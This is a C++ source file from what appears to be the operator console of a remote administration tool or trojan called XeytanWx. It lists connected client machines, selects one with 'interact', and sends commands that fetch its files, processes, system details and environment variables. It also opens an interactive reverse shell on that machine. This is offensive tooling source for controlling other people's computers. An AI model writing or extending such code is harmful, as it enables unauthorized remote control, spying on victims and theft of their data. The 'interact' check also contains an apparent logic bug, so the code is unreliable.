#include "IUiMediator.h"
#include <wx/app.h>
#include <wx/frame.h>
#include "../../shared/ConcurrentLib/core/ThreadRunnableRunner.h"
#include "../../shared/ConcurrentLib/core/RunnableFuncThread.h"
#include "../../shared/NetLib/packets/Packet.h"
#include "../../shared/NetLib/packets/PacketPresentation.h"
#include "../../shared/NetLib/PacketShell.h"
#include "concurrent/events/ClientAppEvent.h"
#include "../../shared/NetLib/packets/PacketInformation.h"
#include "../../shared/NetLib/packets/PacketFileSystem.h"
#include "../../shared/NetLib/packets/PacketProcess.h"


IUiMediator::IUiMediator() : currentView(View::Main)
{
}


IUiMediator::~IUiMediator()
{
}

void IUiMediator::setUiChannel(const wxSharedPtr<UiAppEventDoubleQueueThreadChannel>& channel)
{
	this->channel = channel;
}

wxString Slice(const wxString& s, size_t from, size_t to)
{
	return s.Mid(from, (to - from));
}


void splitString(const wxString& source, wxArrayString& result, wxChar delimiter = ' ', int skip = 0)
{
	int start = 0;
	int end = source.Find(delimiter);

	while (end != wxString::npos)
	{
		if (skip > 0)
		{
			skip--;
		}
		else
		{
			result.Add(Slice(source, start, end - start));
		}

		start = end + 1;
		end = source.find(delimiter, start);
	}

	result.Add(Slice(source, start, end - start));
}

bool IUiMediator::handleInstruction(char* buffer)
{
	wxString command = buffer;

	const wxChar delimiter = ' ';

	wxArrayString parts;

	splitString(command, parts, delimiter);

	if (activeClient == nullptr)
	{
		if (parts[0].CmpNoCase("interact") && parts.GetCount() > 1)
		{
			const wxString idStr = parts.at(1);

			uint64_t clientId;

			idStr.ToULongLong(&clientId);

			wxSharedPtr<AppEvent> event;

			event.reset(new ClientAppEvent(Subject::Connection, Action::Start, clientId));

			channel->submitToApp(event);

			return true;
		}
		else if (command.CmpNoCase("ls") == 0)
		{
			wxSharedPtr<AppEvent> event;
			event.reset(new AppEvent(Target::Server, Subject::Connection, Action::ListAvailable));

			channel->submitToApp(event);

			return true;
		}
	}
	else
	{
		if (currentView == View::ReverseShell)
		{
			wxSharedPtr<AppEvent> ev;
			ev.reset(new ClientAppEvent(Subject::ReverseShell, Action::Push, activeClient));
			ev->object = std::make_shared<wxString>(command);

			channel->submitToApp(ev);
			return true;
		}
		else if (parts[0].CmpNoCase("ls") == 0)
		{
			std::shared_ptr<wxString> path = std::make_shared<wxString>(command);
			if (parts.GetCount() > 1)
			{
				// "ls C:/" -> remove "ls " so we find first not space after ls
				const size_t firstNotSpace = path->find_first_not_of(' ', 2);
				path->erase(0, firstNotSpace);
			}

			wxSharedPtr<AppEvent> ev;
			// const std::shared_ptr<void> path = std::make_shared<wxString>("");
			ev.reset(new ClientAppEvent(Subject::FileSystem, Action::Fetch, activeClient, path));

			channel->submitToApp(ev);
			return true;
		}
		else if (command.CmpNoCase("ps") == 0)
		{
			wxSharedPtr<AppEvent> ev;
			ev.reset(new ClientAppEvent(Subject::Process, Action::Fetch, activeClient));
			channel->submitToApp(ev);
			return true;
		}
		else if (command.CmpNoCase("sysinfo") == 0)
		{
			wxSharedPtr<AppEvent> ev;
			ev.reset(new ClientAppEvent(Subject::Information, Action::Fetch, activeClient));
			channel->submitToApp(ev);
			return true;
		}
		else if (command.CmpNoCase("shell") == 0)
		{
			wxSharedPtr<AppEvent> ev;
			ev.reset(new ClientAppEvent(Subject::ReverseShell, Action::Start, activeClient));
			currentView = View::ReverseShell;
			channel->submitToApp(ev);
			return true;
		}
	}

	return false;
}

void IUiMediator::mainLoop()
{
	running = true;
	const auto handler = std::bind(&IUiMediator::listenAppEvents, this);
	appEventListenerThread = new ThreadRunnableRunner<IUiMediator>(handler);
	appEventListenerThread->Run();

	wxFrame* frame = new wxFrame(nullptr, wxID_ANY, "XeytanWx");
	frame->Show(true);


	RunnableThread* cliThread = new RunnableThread([this]() -> void*
	{
		char line[256];

		while (running)
		{
			printPrompt();
			std::cin.getline(line, 256);
			if (!handleInstruction(line))
			{
				std::cout << "Unknown instruction" << std::endl;
			}

			printPrompt();
		}

		return nullptr;
	});

	cliThread->Create();
	cliThread->Run();
	// Enter wx Main loop
	wxTheApp->OnRun();
}

void IUiMediator::printPrompt()
{
	std::cout << "XeytanWx";

	if (activeClient != nullptr)
		std::cout << "/" << activeClient->pcName;

	std::cout << " >";
}

void IUiMediator::printClients(std::vector<wxSharedPtr<Client>>* clients)
{
	if (clients == nullptr)
		return;

	std::cout << "" << std::endl;

	for (auto&& client : *clients)
	{
		std::cout << "PcName: " << client->pcName << std::endl;
		std::cout << "Os: " << client->osName << std::endl;
		std::cout << "username: " << client->username << std::endl;
	}
	std::cout << std::endl << std::endl;
}


void IUiMediator::listenAppEvents()
{
	while (running)
	{
		wxSharedPtr<AppEvent> appEvent = channel->takeFromApp();
		if (appEvent == nullptr)
		{
			std::cout << "AppEvent is null" << std::endl;
			continue;
		}

		Target target = appEvent->target;
		Subject subject = appEvent->subject;
		// wxSharedPtr<void> object = netEvent->object;
		Action action = appEvent->action;

		if (target == Target::Server)
		{
			if (subject == Subject::Connection)
			{
				if (action == Action::ListAvailable)
				{
					std::vector<wxSharedPtr<Client>>* clients =
						(std::vector<wxSharedPtr<Client>>*)appEvent->object.get();

					if (clients == nullptr)
						return;

					printClients(clients);
				}
			}
		}
		else if (target == Target::Client)
		{
			const wxSharedPtr<Client> client = ((ClientAppEvent*)appEvent.get())->client;

			if (subject == Subject::PacketReceived)
			{
				activeClient = client;
				Packet* packet = (Packet*)appEvent->object.get();
				if (packet->packetType == PacketType::Presentation)
				{
					PacketPresentation* packetPresentation = (PacketPresentation*)packet;
					std::cout << "Got new connection " << packetPresentation->pcName << std::endl;
					std::cout << "\t" + packetPresentation->osName << std::endl;
					std::wcout << "\t" + packetPresentation->username.ToStdWstring() << std::endl;
				}
				else if (packet->packetType == PacketType::FileSystem)
				{
					PacketFileSystem* packetFs = (PacketFileSystem*)packet;
					wxString path = packetFs->path;

					if (path.IsEmpty())
					{
						std::cout << "Mount points for " << client->pcName << std::endl;
					}
					else
					{
						std::cout << "List files for " << client->pcName << std::endl;
					}

					std::vector<FileInfo>::const_iterator it = packetFs->files.cbegin();

					while (it != packetFs->files.cend())
					{
						FileInfo fi = *it;
						std::cout << fi.filePath;

						if ((long long)fi.size >= 0)
						{
							std::cout << "\t" << fi.size << "\t" << fi.lastUpdateTime;
						}

						std::cout << std::endl;

						++it;
					}
				}
				else if (packet->packetType == PacketType::ClientInformation)
				{
					PacketInformation* packetInformation = (PacketInformation*)packet;
					std::cout << std::endl
						<< "Information from " << packetInformation->pcName << std::endl
						<< "Username: " << packetInformation->username << std::endl
						<< "OS: " << packetInformation->osName << std::endl << std::endl;

					std::map<std::string, std::string>::const_iterator it = packetInformation->env.cbegin();

					std::cout << "Environment variables" << std::endl;
					while (it != packetInformation->env.cend())
					{
						std::cout << it->first << ":" << it->second << std::endl;
						++it;
					}
				}
				else if (packet->packetType == PacketType::ReverseShell)
				{
					PacketShell* packetShell = (PacketShell*)packet;
					std::cout << packetShell->data;
				}
				else if (packet->packetType == PacketType::ProcessList)
				{
					PacketProcess* packetProcess = (PacketProcess*)packet;
					printProcesses(packetProcess->processes);
				}
				else
				{
					std::cout << "Unknown packet type " << (int)packet->packetType << std::endl;
				}

				printPrompt();
			}
		}
	}
}

void IUiMediator::printProcesses(const std::vector<Process>& processes)
{
	std::cout << std::endl << std::endl;
	if (processes.empty())
	{
		std::cout << "Process list is empty ;(" << std::endl << std::endl;
		return;
	}

	for (auto&& process : processes)
	{
		std::cout << "Pid: " << process.pid << std::endl;
		std::wcout << "Path: " << process.path << std::endl;
		if (process.hasUi)
			std::wcout << "Window Title: " << process.title << std::endl;
		std::cout << std::endl;
	}
}
